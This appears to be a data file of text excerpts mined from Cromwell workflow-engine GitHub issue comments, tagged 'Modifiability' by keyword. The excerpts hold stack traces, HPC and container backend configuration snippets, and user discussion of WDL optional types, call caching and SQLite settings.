akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried adding the [reference services block](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L480), but then I received yet another error: . ```; 2019-02-25 18:46:46,698 cromwell-syst",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1478,config,config,1478,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"ecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionAct",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:3098,config,config,3098,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['config'],['config']
Modifiability,"een comfortable in my understanding of Singularity. If you are using a container, it definitely is an ""either / or"" in the sense that getting one working inside the other is pretty challenging. The reason a Dockerized cromwell doesn't work on a host (to submit jobs to other docker or singularity containers) is because of having the docker/singularity submit come from inside the container. We don't really want to do that anyway, because there is a double dependency. But on the other hand, we want to provide reproducible solutions, meaning that things are container based. In an ideal setup, I would have some (still container based) cromwell acting as more of a docker-compose setup, and issuing commands to other containers. Ideally there would be one maintained Docker container for a step in a pipeline, and then if it's run on an HPC resource (where you can't have docker) it would just be dumped into singularity (`docker://<username>/<reponame>`). But this case is a little different - I'm just talking about the cromwell ""plugin"". I don't actually understand why this is necessary, at least given that singularity containers can act like executable. If I want to run a python script, I run it in the command section, as an executable. I don't require a python plugin. Now given that Singularity changes so that we want to take advantage of more of the instance commands (e.g., we can start, stop, get a status) this might make it more like docker and warrant a plugin. But for now, it's not quite there, and making a plugin would just be a really fancy interface to run an executable. Does this make sense?. > @vsoch you're obviously well versed in all things Singularity - do you see any utility to defining the use of a Singularity container in the WDL (ie no matter what this task should always use Singularity) or is it going to be more of a site specific situation, like hwat you're showing here?. I don't think it would be site specific (if the container is singularity, it would la",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412171685:1306,plugin,plugin,1306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412171685,1,['plugin'],['plugin']
Modifiability,"efore the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1124,config,config,1124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['config'],['config']
Modifiability,elegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenResp,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4417,config,config,4417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,"ell command to run after the execution of every command block. #. # If this value is not set explicitly, the default value is `sync`, equivalent to:. # script-epilogue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possible runtime custom attributes. runtime-attributes = """""". String? docker. String? docker_name. """""". . # Submit string when there is no ""docker"" runtime attribute. submit = ""/bin/bash ${script}"". . # Submit string when there is a ""docker"" runtime attribute. submit-docker = """""". chmod u+x ${cwd}/execution/script && \. docker run --rm \. -v ${cwd}:${docker_cwd} \. ${docker_name} /bin/bash -c ${script}. """""". . # Root directory where Cromwell writes job results. This directory must be. # visible and writeable by the Cromwell process as well as the jobs that Cromwell. # launches. root = ""cromwell-executions"". . # File system configuration. filesystems {. . # For SFS backends, the ""local"" configuration specifies how files are handled. local {. . # Try to hard link (ln), then soft-link (ln -s), and if both fail, then copy the files. localization: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Call caching strategies. caching {. # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:. duplication-strategy: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Possible values: file, path. # ""file"" will compute an md5 hash of the file content. # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",. # in order to allow for the original file path to be hashed. hashing-strategy: ""file"". . # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. # If false or the md5 does not exist, will proceed with the above-defined hashing strategy. check-sibling-md5: false.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:2689,config,configuration,2689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,1,['config'],['configuration']
Modifiability,"ell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback val",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1119,variab,variable,1119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,1,['variab'],['variable']
Modifiability,"ell-executions/"") && \; sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script && \; chmod 775 ${cwd}/execution/script && \; singularity exec --bind /exports:/data/,$CROMWELLROOT:/config docker://${docker} ${script}' | \; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr; """"""; dockerRoot = ""/config""; ```; > This only works if your container has both a /data and /config mount point. I tested this (very shallowly) using biocontainers. Line by line:; 1. `CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"")` ; 1. If dockerRoot is `/cromwell-executions`; 2. The script will contains paths like: `/cromwell-executions/test/<hash>/call-task/execution/rc`; 3. Therefore we need to have the entire structure under the root of the execution folder mounted, as such, we need to bind the entire execution folder.; 4. This gets the path to the root of the execution folder.; - I also tried setting dockerRoot to be the same as `cwd`: `dockerRoot = ""${cwd}""`, but this resulted in `${cwd}` being placed literally in the execution script. If this had been an option we wouldn't have to bind the execution directory separately (I think), but since it isn't we do have to do so.; 1. `sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script` ; - This a bit of a nasty workaround to convert absolute paths used in the commands to what their path would be in the container. This is necessary if you have (eg.) a String type output directory in a command. There are other ways of dealing with this, you could make a /data directory which links to /exports for example.; 1. `chmod 775 ${cwd}/execution/script`; - Make the script executable.; 1. `singularity exec --bind /exports:/data/,$CROMWELLROOT:/config docker://${docker} ${script}'`; - Run the script in singularity, binding the cromwell execution folder to /config and /exports to /data.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799:2149,config,config,2149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799,2,['config'],['config']
Modifiability,ell-system-akka.dispatchers.backend-dispatcher-88 ERROR - BackgroundConfigAsyncJobExecutionActor [UUID(c9194073)main:NA:1]: Error attempting to Execute; java.lang.Exception: Failed command instantiation; 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:581); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:515); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:317); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsy,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:1096,config,config,1096,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,"end.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-li",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:4076,Config,ConfigAsyncJobExecutionActor,4076,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,er-29 ERROR - No configuration setting found for key 'services'; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor: exception during creation; 	at akka.actor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCe,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1086,Config,ConfigException,1086,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,2,"['Config', 'config']","['ConfigException', 'configuration']"
Modifiability,"erformed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2189,config,configuration,2189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['config'],['configuration']
Modifiability,"es} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm sure that I (and @illusional if he is able) would be happy to write this up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1701,config,config,1701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,3,"['config', 'sandbox']","['config', 'sandbox']"
Modifiability,"ete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: Unique constraint UC_CUSTOM_LABEL_ENTRY_CLK_CLV_WEU dropped from CUSTOM_LABEL_ENTRY; 2018-06-07 12:16:11,094 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: Unique constraint added to CUSTOM_LABEL_ENTRY(CUSTOM_LABEL_KEY, WORKFLOW_EXECUTION_UUID); 2018-06-07 12:16:11,094 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: ChangeSet metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionToken",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96258,config,configuration,96258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configuration']
Modifiability,"figAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.Standard",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:2576,Config,ConfigAsyncJobExecutionActor,2576,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,2,['Config'],['ConfigAsyncJobExecutionActor']
